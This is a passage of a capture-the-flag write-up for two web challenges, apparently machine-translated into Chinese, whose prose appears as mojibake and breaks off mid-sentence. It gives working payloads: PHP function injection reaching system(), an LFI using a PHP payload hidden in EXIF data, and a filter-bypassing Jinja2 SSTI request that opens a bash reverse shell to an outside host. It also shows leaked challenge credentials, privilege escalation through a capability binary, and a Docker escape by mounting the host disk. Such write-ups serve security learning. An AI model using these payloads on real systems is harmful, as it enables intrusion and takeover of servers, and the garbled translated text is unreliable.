<br></div></div><br><div class="spoiler">  <b class="spoiler_title">åŒ…å«/ verify.php</b> <div class="spoiler_text"><pre> <code class="php hljs"> <span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">verify_parameters</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'submit'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::POST_SUBMIT; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_FILES[<span class="hljs-string"><span class="hljs-string">'imageFile'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::IMAGE_NOT_FOUND; } $target_file = ImageUploader::TARGET_DIR . basename($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>]); $imageFileType = strtolower(pathinfo($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"name"</span></span>], PATHINFO_EXTENSION)); $imageFileInfo = getimagesize($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"tmp_name"</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($imageFileInfo === <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::NOT_IMAGE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($_FILES[<span class="hljs-string"><span class="hljs-string">"imageFile"</span></span>][<span class="hljs-string"><span class="hljs-string">"size"</span></span>] &gt; <span class="hljs-number"><span class="hljs-number">1024</span></span>*<span class="hljs-number"><span class="hljs-number">32</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::BIG_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!in_array($imageFileType, [<span class="hljs-string"><span class="hljs-string">'jpg'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_EXTENSION; } $imageMimeType = $imageFileInfo[<span class="hljs-string"><span class="hljs-string">'mime'</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($imageMimeType !== <span class="hljs-string"><span class="hljs-string">'image/jpeg'</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_MIMETYPE; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (file_exists($target_file)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::FILE_EXISTS; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]) || !<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_POST[<span class="hljs-string"><span class="hljs-string">'text'</span></span>])) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INVALID_PARAMS; } $size = intval($_POST[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (($size &lt;= <span class="hljs-number"><span class="hljs-number">0</span></span>) || ($size &gt; <span class="hljs-number"><span class="hljs-number">512</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> UploadError::INCORRECT_SIZE; } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br></div></div><br> è¿™ç»™äº†æˆ‘ä»¬ï¼š <br><ul><li>  Admin Basicçš„ç”¨æˆ·å/å¯†ç ã€‚ å®Œå…¨æ²¡ç”¨ï¼Œå®ƒåªè¾“å‡ºå­—ç¬¦ä¸²ï¼š <br>  <i>æ­å–œ</i>  <i>ç°åœ¨æ‚¨å¯ä»¥é˜…è¯»æºä»£ç ã€‚</i>  <i>æ·±å…¥ä¸€ç‚¹ã€‚</i> </li><li>  â€œ <i>è¿‡æ»¤å™¨</i> â€è¾“å…¥ä¸Šçš„åŠŸèƒ½æ³¨å…¥ï¼ˆFIï¼‰ã€‚ </li><li> å›¾åƒä¸Šä¼ éªŒè¯ç°åœ¨å¯¹æˆ‘ä»¬æ¥è¯´å¾ˆæ¸…æ¥šã€‚ </li><li> ä½¿ç”¨ImageMagicåº“ã€‚ å‡å®šå°†å…¶ç”¨äºæ¼æ´åˆ©ç”¨æ˜¯ä¸€ä¸ªæ­»è·¯ã€‚ æˆ‘è®¤ä¸ºæ²¡æœ‰ä¾èµ–FIçš„æ–¹æ³•å°±æ— æ³•åˆ©ç”¨å®ƒã€‚ </li></ul><br><h4> æ¼æ´ï¼šåŠŸèƒ½æ³¨å…¥ </h4><br> æ–‡ä»¶<b>upload.php</b>æœ‰ä¸€äº›å¯ç–‘ä»£ç ï¼š <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br> æˆ‘ä»¬å¯ä»¥å°†å…¶ç®€åŒ–ä¸ºï¼š <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br> å®é™…ä¸Šï¼Œåªéœ€è¿›è¡Œä¸€äº›æ¨¡ç³Šæµ‹è¯•å°±å¯ä»¥æ£€æµ‹åˆ°æ­¤æ¼æ´ã€‚ åœ¨â€œ <i>è¿‡æ»¤å™¨</i> â€è¾“å…¥ä¸­å‘é€â€œ <b>var_dump</b> â€æˆ–â€œ <b>debug_zval_dump</b> â€ä¹‹ç±»çš„å‡½æ•°åç§°å°†å¯¼è‡´æœåŠ¡å™¨äº§ç”Ÿæœ‰è¶£çš„å“åº”ã€‚ <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br> ä½†è¿™ä¸æ˜¯æˆ‘ä»¬çš„æƒ…å†µã€‚ è§£å†³ä»»åŠ¡è‡³å°‘æœ‰ä¸¤ç§æ–¹æ³•ã€‚ <br><br><h4>  filter_input_arrayå‘é‡ï¼ˆéé¢„æœŸè§£å†³æ–¹æ¡ˆï¼‰ï¼šRCEå‘é‡ </h4><br> åœ¨è€ƒè™‘è·å–RCEçš„å¯èƒ½æ–¹æ³•æ—¶ï¼Œæˆ‘æ³¨æ„åˆ°<code>function filter_input_array</code>ä½¿æˆ‘ä»¬å¯ä»¥å¾ˆå¥½åœ°æ§åˆ¶<code>$filterImage variable</code> ã€‚ <br><br> é€šè¿‡<b>è¿‡æ»¤å™¨æ•°ç»„</b>ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œå°†å…è®¸åœ¨å‡½æ•°ç»“æœä¸Šæ„å»ºä»»æ„æ•°ç»„ã€‚ <br><br> ä½†æ˜¯ImageMagicæœŸæœ›é™¤äº†Imagickç±»ä¹‹å¤–ä»€ä¹ˆéƒ½ä¸ä¼šå¾—åˆ°ã€‚  :( <br><br> ä¹Ÿè®¸æˆ‘ä»¬å¯ä»¥ä»è¾“å…¥ä¸­ååºåˆ—åŒ–ç±»ï¼Ÿ è®©æˆ‘ä»¬åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">filter_input_array description</a>å¤„æŸ¥æ‰¾å…¶ä»–è¿‡æ»¤å™¨å‚æ•°ã€‚ <br><br> å‡½æ•°é¡µé¢æœ¬èº«ä¸Šæ²¡æœ‰æåˆ°å®ƒï¼Œä½†å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ä¼ é€’<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å›è°ƒä»¥è¿›è¡Œè¾“å…¥éªŒè¯</a> ã€‚  FILTER_CALLBACKç¤ºä¾‹é€‚ç”¨äº<code>filter_input</code> ï¼Œä½†å®ƒä¹Ÿé€‚ç”¨äº<code>filter_input_array</code> ï¼ <br><br> è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¸¦æœ‰ä¸€ä¸ªå‚æ•°ï¼ˆä¾‹å¦‚evalï¼ŸSystemï¼Ÿï¼‰çš„å‡½æ•°æ¥â€œéªŒè¯â€è‡ªå®šä¹‰ç”¨æˆ·è¾“å…¥ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¯¥å‚æ•°ã€‚ <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br> è·å¾—RCEçš„ç¤ºä¾‹ï¼š <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br> å›åº”ï¼š <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  <b>æœç´¢çš„</b>è¡Œï¼š <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br> è‚¯å®šæœ‰ä»€ä¹ˆä¸å¯¹åŠ²ï¼Œå› ä¸ºæˆ‘ä»¬ä¸ºä»€ä¹ˆè¿˜è¦è·å–æºä»£ç ï¼Ÿ åªæ˜¯ä¸€ä¸ªæç¤ºï¼Ÿ ä¸ºä»€ä¹ˆä¸Šä¼ çš„æ–‡ä»¶å­˜å‚¨åœ¨ç£ç›˜ä¸Šï¼Œä¸å­˜å‚¨æ¥è‡ªæŒ‘æˆ˜ç”¨æˆ·çš„åƒåœ¾æ–‡ä»¶æ˜¯å¦æ›´æ–¹ä¾¿ï¼Ÿ <br><br> å·§åˆå‘½åä¸º<b>filter</b> = <b>filter</b> _input_arrayï¼Œæ–‡æœ¬[a] [ <b>filter</b> ]ä½¿æˆ‘ç¡®ä¿¡ä¸€åˆ‡éƒ½æŒ‰é¢„æœŸè¿›è¡Œï¼ˆâ€œä»æœªè§è¿‡çš„<b>è¿‡æ»¤å™¨</b> â€ï¼Œé€‰ä¸­âœ“ï¼‰ã€‚ <br><br><h4>  spl_autoloadçŸ¢é‡å›¾ï¼šLFIçŸ¢é‡å›¾ </h4><br> æäº¤è§£å†³æ–¹æ¡ˆåï¼ŒæŒ‘æˆ˜ä½œè€…ä¹‹ä¸€è”ç³»äº†æˆ‘ï¼Œä»–ä»¬è¯´æˆ‘çš„è½½ä½“ä¸æ˜¯é¢„æœŸçš„ï¼Œå¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªå‡½æ•°ï¼ˆ <code>spl_autoload</code> ï¼‰ï¼š <br><br> æˆ‘ä»¬ä¸çŸ¥é“å¦‚ä½•ä½¿ç”¨æ­¤å‡½æ•°ï¼Œå› ä¸ºåº”è¯¥ä»åä¸ºâ€œ &lt;class_name&gt; &lt;some_extension&gt;â€çš„æ–‡ä»¶ä¸­åŠ è½½ç±»â€œ &lt;class_name&gt;â€ã€‚ ç­¾åå¦‚ä¸‹ï¼š <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br> æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°åªèƒ½æ˜¯æ•°å­—ï¼ˆ1-512ï¼‰ï¼Œæ‰€ä»¥<i>ç±»å</i>æ˜¯...æ•°å­—ï¼Ÿ...å¾ˆå¥‡æ€ªã€‚ <br>  <i>æ‰©å±•å</i>å‚æ•°çœ‹èµ·æ¥ä¹Ÿä¸å¯ç”¨ï¼Œå—æ§æ–‡ä»¶æ¯”<b>upload.php</b>è¿˜è¦<b>æ·±ä¸€å±‚</b> ï¼ˆæˆ‘ä»¬éœ€è¦ä¼ é€’ä¸€ä¸ªå‰ç¼€ï¼‰ã€‚ <br><br> å¦‚æœä»¥è¿™ç§æ–¹å¼ä½¿ç”¨ï¼Œæ­¤å‡½æ•°å®é™…ä¸Šå¯ä»¥ä¸ºæˆ‘ä»¬æä¾›LFIï¼š <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br> ç›®å½•åæ˜¯ä»æ³„æ¼çš„æºä»£ç ä¸­è·å–çš„ã€‚ è€Œä¸”æˆ‘ä»¬å¾ˆå¹¸è¿ï¼Œå› ä¸ºå¦‚æœnameçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯æ•°å­—ä»¥å¤–çš„ä»»ä½•æ•°å­—-&gt;æˆ‘ä»¬å°±ä¸èƒ½åœ¨å…¶ä¸­åŒ…å«æ–‡ä»¶ã€‚ <br><br> æ‰€ä»¥...ç°åœ¨æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ä¼ é€’ä¸€ä¸ªâ€œæœ‰æ•ˆç§ç±»â€ï¼ˆ <b>getimagesize</b>å¿…é¡»æ¥å—ï¼‰ <b>* .jpg</b>æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹phpä»£ç ã€‚ é™„æœ‰ç®€å•ç¤ºä¾‹ï¼ˆexifä¸­çš„phpæœ‰æ•ˆè´Ÿè½½ï¼‰ã€‚ <br><br> å°†å…¶ä¸Šä¼ ä¸º<i>1111.jpg</i> ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š <br><br>  GETï¼š <br> ä¸€ä¸ª= / get_the_flag <br><br> å¼€æœºè‡ªæ£€ï¼š <br> ç­›é€‰å™¨= spl_autoload <br> å¤§å°= 51 <br> æ–‡å­—= a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br> æäº¤= 1 <br><br> å›åº”ï¼š <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  <b>æœç´¢çš„</b>è¡Œï¼š <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br> ä¸Šè½½å’ŒLFIå¯ä»¥åœ¨ä¸€ä¸ªè¯·æ±‚ä¸­å®Œæˆã€‚ <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a> ç¬¬5å¤© æ—¶é—´ </h2><br> æ­¤ä»»åŠ¡ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ•°å­—å®‰å…¨å›¢é˜Ÿ</a>å‡†å¤‡ <br>  <i>æ‚¨éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯åˆ¶æœæ—¶é—´ï¼Œç¬¬äºŒä»¶äº‹æ˜¯è¶…è¶Šå°ä¸–ç•Œã€‚</i>  <i>ä¹‹åï¼Œæ‚¨å°†è·å¾—å¯¹æŠ—è€æ¿æœ€ç»ˆç­‰çº§çš„æ­¦å™¨ã€‚</i>  <i>ç¥ä½ å¥½è¿ï¼</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>æç¤º</b> <br>  <i><b>10/27/2018 16:00</b></i> <i><br></i>  <i>å“¦ï¼Œä¸€ä¸ªç›’å­ä¸Šæœ‰å¤šå°‘ä¸ªè®¾å¤‡â€¦â€¦å®ƒä»¬çœŸçš„æœ‰ç”¨å—ï¼Ÿ</i> <i><br></i>  <i><b>10/27/2018 14:35</b></i> <i><br></i>  <i>å¦‚æœæ‚¨èƒ½å¤Ÿå¤„ç†æ—¶é—´é¢æ¿ä¸Šçš„è¿‡æ»¤å™¨ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ•´ä¸ªç³»ç»Ÿçš„åŠŸèƒ½ã€‚</i>  <i>ä¸è¦å®³ç¾ã€‚</i> <i><br></i>  <i><b>10/27/2018 14:25</b></i> <i><br></i>  <i>æ£€æŸ¥è™šæ‹Ÿä¸»æœºï¼Œä¸è¦åœç•™åœ¨200</i> <i><br></i>  <i><b>10/26/2018 19:25</b></i> <i><br></i>  <i>ä»»åŠ¡æ²¡æœ‰è§£å†³ã€‚</i>  <i>æ·»åŠ äº†24å°æ—¶ã€‚</i> <i><br></i>  <i><b>10/26/2018 17:35</b></i> <i><br></i>  <i>ä½¿ç”¨æ‰€æœ‰åŠŸèƒ½ã€‚</i> <i><br></i>  <i><b>10/26/2018 12:25</b></i> <i><br></i>  <i>æ‚¨ä¸éœ€è¦ä»»ä½•å–è¯è½¯ä»¶å³å¯å®Œæˆä»»åŠ¡çš„ä»»ä½•é˜¶æ®µã€‚</i> <br><br><h4>  1ï¼‰WordPress </h4><br> æœ€åˆï¼Œæˆ‘ä»¬çš„åœ°å€ä¸º<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">51.15.75.80</a> ã€‚ <br> æˆ‘ä»¬è¿è¡Œhehdirb-æˆ‘ä»¬çœ‹åˆ°ç›®å½•/ wordpress /ã€‚ ç«‹å³è½¬åˆ°<i>adminï¼šadmin</i>ä¸‹çš„ç®¡ç†é¢æ¿ã€‚ <br> åœ¨ç®¡ç†é¢æ¿ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°æ²¡æœ‰æ›´æ”¹æ¨¡æ¿çš„æƒé™ï¼Œå› æ­¤æ‚¨ä¸èƒ½ä»…è·å¾—RCEã€‚ ä½†æ˜¯ï¼Œæœ‰ä¸€ä¸ªéšè—çš„å¸–å­ï¼š <br>  <i>2018/09/25é€šè¿‡ç®¡ç†å‘˜</i> <i><br></i>  <i>ç§äººï¼šå…³äºæ—¶é—´é¢æ¿çš„æ³¨é‡Š</i> <i><br></i>  <i>ç™»å½•åï¼šcristopher</i> <i><br></i>  <i>å¯†ç ï¼šL2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>ä¸»æŒäººï¼štimepanel.zn</i> <br><br><h4>  2ï¼‰SSTI </h4><br> æ˜¾ç„¶ï¼Œæ‚¨éœ€è¦é€šè¿‡æŒ‡å®šè™šæ‹Ÿä¸»æœº<b>timepanel.zn</b>è½¬åˆ°åŒä¸€å°æœåŠ¡å™¨<b>ã€‚</b> <br> æˆ‘ä»¬åœ¨æ­¤ä¸»æœºä¸Šå¯åŠ¨hehdirb-æˆ‘ä»¬çœ‹åˆ°/ adm_authç›®å½•ï¼Œè¿›å…¥ä¸Šé¢ç»™å‡ºçš„ç™»å½•åå’Œå¯†ç ã€‚ æˆ‘ä»¬çœ‹åˆ°æ‚¨éœ€è¦è¾“å…¥æ—¥æœŸï¼ˆâ€œä»â€å’Œâ€œåˆ°â€ï¼‰ä»¥è·å–ä¸€äº›ä¿¡æ¯çš„è¡¨æ ¼ã€‚ åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨å“åº”HTMLä»£ç ä¸­çœ‹åˆ°ä¸€æ¡æ³¨é‡Šï¼Œå…¶ä¸­åæ˜ äº†ç›¸åŒçš„æ—¥æœŸï¼š <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br> æ˜¾ç„¶ï¼Œæ­¤å¤„çš„é”™è¯¯å¾ˆå¯èƒ½ä¸è¿™ç§åå°„æœ‰å…³ï¼Œå¹¶ä¸”ä¸å¤ªå¯èƒ½æ˜¯XSSï¼Œå› æ­¤è¯·å°è¯•SSTIï¼š <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br> ç­”æ¡ˆæ˜¯ï¼š <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br> é€šè¿‡å‘é€{{self}}ï¼Œ{{'a'* 5}}ï¼Œæˆ‘ä»¬æ„è¯†åˆ°è¿™æ˜¯<b>Jinja2</b> ï¼Œä½†æ˜¯æ ‡å‡†å‘é‡ä¸èµ·ä½œç”¨ã€‚ å‘é€ä¸å¸¦{{brackets}}çš„å‘é‡ï¼Œæˆ‘ä»¬çœ‹åˆ°ç­”æ¡ˆæ²¡æœ‰åæ˜ å­—ç¬¦â€œ _â€å’ŒæŸäº›å•è¯ï¼Œä¾‹å¦‚â€œ classâ€ã€‚ é€šè¿‡ä½¿ç”¨request.argså’Œ| attrï¼ˆï¼‰æ„é€ ï¼Œä»¥åŠä½¿ç”¨è½¬ä¹‰åºåˆ—å¯¹æŸäº›å­—èŠ‚è¿›è¡Œç¼–ç ï¼Œå¯ä»¥è½»æ¾ç»•è¿‡æ­¤è¿‡æ»¤å™¨ã€‚ <br><br><div class="spoiler">  <b class="spoiler_title">æœ€ç»ˆæŸ¥è¯¢åå‘è¿æ¥</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3ï¼‰LPE </h4><br> æ”¶åˆ°RCEåï¼Œæˆ‘ä»¬äº†è§£åˆ°æ‚¨éœ€è¦æå‡rootç”¨æˆ·ç‰¹æƒã€‚ æˆ‘ä¸æƒ³æè¿°ä¸€äº›é”™è¯¯çš„è·¯å¾„ï¼ˆ/usr/bin/specialã€/opt/privesc.pyç­‰ï¼‰ï¼Œå› ä¸ºå®ƒä»¬ä»…èŠ±è´¹æ—¶é—´ã€‚ è¿˜æœ‰ä¸€ä¸ªbinar / usr / bin / zeroï¼Œå®ƒæ²¡æœ‰suidä½ï¼Œä½†äº‹å®è¯æ˜å®ƒå¯ä»¥è¯»å–ä»»ä½•æ–‡ä»¶ï¼ˆåªéœ€å°†å…¶ä»¥stdinçš„åå…­è¿›åˆ¶ç¼–ç è·¯å¾„å‘é€ï¼‰å³å¯ã€‚ <br><br> åŸå› æ˜¯åŠŸèƒ½ï¼ˆ/ usr / bin / 0 = cap_dac_read_search + epï¼‰ã€‚ <br> æˆ‘ä»¬è¯»å–äº†é˜´å½±ï¼Œè®¾ç½®äº†è¦åˆ·çš„å“ˆå¸Œå€¼ï¼Œä½†æ˜¯åœ¨åˆ·å®Œå“ˆå¸Œåï¼Œæˆ‘ä»¬çŒœæµ‹æˆ‘ä»¬éœ€è¦è¯»å–ç³»ç»Ÿä¸Šå¦ä¸€ä¸ªç”¨æˆ·çš„æ–‡ä»¶ï¼š <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>æˆ‘å¯ä»¥ä¸ºä½ è¯»ä¹¦</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4ï¼‰Dockeré€ƒç”Ÿ/å–è¯ </h4><br> å› æ­¤ï¼Œæˆ‘ä»¬æœ‰æ ¹ã€‚ ä½†è¿™è¿˜ä¸æ˜¯ç»ˆç‚¹ã€‚ æˆ‘ä»¬<i>å°†apt install extundeleteæ”¾å…¥</i>æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¹¶æ‰¾åˆ°ä¸ä¸‹ä¸€ä¸ªé˜¶æ®µç›¸å…³çš„å…¶ä»–ä¸€äº›æœ‰è¶£çš„æ–‡ä»¶ï¼š <br><br>  <i>è¦è·å¾—ç¥¨è¯ï¼Œæ‚¨éœ€è¦æ›´æ”¹å›¾åƒä»¥ä½¿å…¶æ ‡è¯†ä¸ºâ€œ 1â€ã€‚</i>  <i>æ‚¨æœ‰ä¸€ä¸ªæ¨¡å‹å’Œä¸€ä¸ªå›¾åƒã€‚</i>  <i>curl -X POST -F image=@ZeroSource.bmp'http://51.15.100.188 {6491 / predict'ã€‚</i> <br><br> å› æ­¤ï¼Œç°åœ¨æˆ‘ä»¬é¢ä¸´ç€ä¸ºæœºå™¨å­¦ä¹ æ¨¡å‹ç”Ÿæˆç«äº‰ç¤ºä¾‹çš„æ ‡å‡†ä»»åŠ¡ã€‚ ä½†æ˜¯ï¼Œåœ¨è¿™ä¸€é˜¶æ®µï¼Œæˆ‘ä»ç„¶æ— æ³•è·å¾—æ‰€éœ€çš„æ‰€æœ‰æ–‡ä»¶ã€‚ åªæœ‰å°†R-Studioä»£ç†æ”¾åœ¨æœåŠ¡å™¨ä¸Šå¹¶å¤„ç†è¿œç¨‹å–è¯ï¼Œæ‰æœ‰å¯èƒ½åšåˆ°è¿™ä¸€ç‚¹ã€‚ å‡ ä¹å–å‡ºäº†æˆ‘éœ€è¦çš„ä¸œè¥¿ä¹‹åï¼Œæˆ‘å‘ç°å®é™…ä¸Šdockerå®¹å™¨æ­£åœ¨ä»¥ä¸€ç§å…è®¸æ‚¨è£…è½½æ•´ä¸ªç£ç›˜çš„æ¨¡å¼è¿è¡Œ <br><br> æˆ‘ä»¬æ‰§è¡Œmount / dev / vda1 / root / kekå¹¶è·å¾—å¯¹ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®æƒï¼ŒåŒæ—¶å…·æœ‰å¯¹æ•´ä¸ªæœåŠ¡å™¨çš„rootè®¿é—®æƒï¼ˆå› ä¸ºæˆ‘ä»¬å¯ä»¥æ”¾ç½®è‡ªå·±çš„sshå¯†é’¥ï¼‰ã€‚ æˆ‘ä»¬å–å‡ºKerasModel.h5ï¼ŒZeroSource.bmpã€‚ <br><br><h4>  5ï¼‰å¯¹æŠ—æ€§ML </h4><br> ä»å›¾ç‰‡ä¸­å¯ä»¥æ¸…æ¥šåœ°çœ‹å‡ºï¼Œç¥ç»ç½‘ç»œæ˜¯åœ¨MNISTæ•°æ®é›†ä¸Šè®­ç»ƒçš„ã€‚ å½“æˆ‘ä»¬å°è¯•å°†ä»»æ„å›¾ç‰‡å‘é€åˆ°æœåŠ¡å™¨æ—¶ï¼Œæˆ‘ä»¬å¾—åˆ°çš„ç­”æ¡ˆæ˜¯å›¾ç‰‡å·®å¼‚å¤ªå¤§ã€‚ è¿™æ„å‘³ç€æœåŠ¡å™¨è¦æµ‹é‡å‘é‡ä¹‹é—´çš„è·ç¦»ï¼Œå› ä¸ºå®ƒåªéœ€è¦ä¸€ä¸ªå¯¹æŠ—æ€§ç¤ºä¾‹ï¼Œè€Œä¸ä»…ä»…æ˜¯å…·æœ‰å›¾åƒâ€œ 1â€çš„å›¾ç‰‡ã€‚ <br><br> æˆ‘ä»¬å°è¯•ä»Foolboxæ”¶åˆ°çš„ç¬¬ä¸€ä¸ªæ”»å‡»-æˆ‘ä»¬è·å¾—äº†æ”»å‡»å‘é‡ï¼Œä½†æœåŠ¡å™¨ä¸æ¥å—ï¼ˆè·ç¦»å¤ªå¤§ï¼‰ã€‚ ç„¶åï¼Œæˆ‘ç‹‚å¥”äº†ä¸€ä¸‹ï¼Œå¼€å§‹åœ¨MNISTä¸‹é‡æ–°åˆ¶ä½œâ€œä¸€æ¬¡åƒç´ æ”»å‡»â€å®æ–½æ–¹æ¡ˆï¼Œä½†æ²¡æœ‰ä»»ä½•æ•ˆæœï¼Œå› ä¸ºè¿™ç§æ”»å‡»ä½¿ç”¨å·®åˆ†è¿›åŒ–ç®—æ³•ï¼Œå®ƒä¸æ˜¯æ¢¯åº¦çš„ï¼Œè€Œæ˜¯å°è¯•æ 